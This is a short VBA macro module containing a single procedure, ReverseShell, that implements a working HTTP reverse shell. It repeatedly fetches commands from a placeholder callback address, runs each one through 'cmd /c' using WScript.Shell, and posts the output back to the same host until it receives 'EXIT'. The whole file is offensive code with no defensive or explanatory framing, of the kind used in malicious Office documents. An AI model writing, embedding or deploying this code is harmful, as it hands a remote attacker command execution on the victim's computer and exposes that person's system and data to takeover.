Option Explicit
Dim xmlHttpReq As Object
Dim shell As Object
Dim execObj As Object
Dim command As String
Dim break As Boolean
Dim result As String

Sub ReverseShell()
    Const callbackUrl = "http://x.x.x.x:yyyy/"
    Set shell = CreateObject("WScript.Shell")
    break = False

    Do While break <> True
        Set xmlHttpReq = CreateObject("MSXML2.ServerXMLHTTP")
        xmlHttpReq.Open "GET", callbackUrl, False
        xmlHttpReq.Send
        command = "cmd /c " & Trim(xmlHttpReq.responseText)

        If InStr(command, "EXIT") Then
            break = True
        Else
            Set execObj = shell.Exec(command)
            result = ""
            Do While Not execObj.StdOut.AtEndOfStream
                result = result & execObj.StdOut.ReadAll
            Loop
            Set xmlHttpReq = CreateObject("MSXML2.ServerXMLHTTP")
            xmlHttpReq.Open "POST", callbackUrl, False
            xmlHttpReq.Send (result)
        End If
    Loop
End Sub

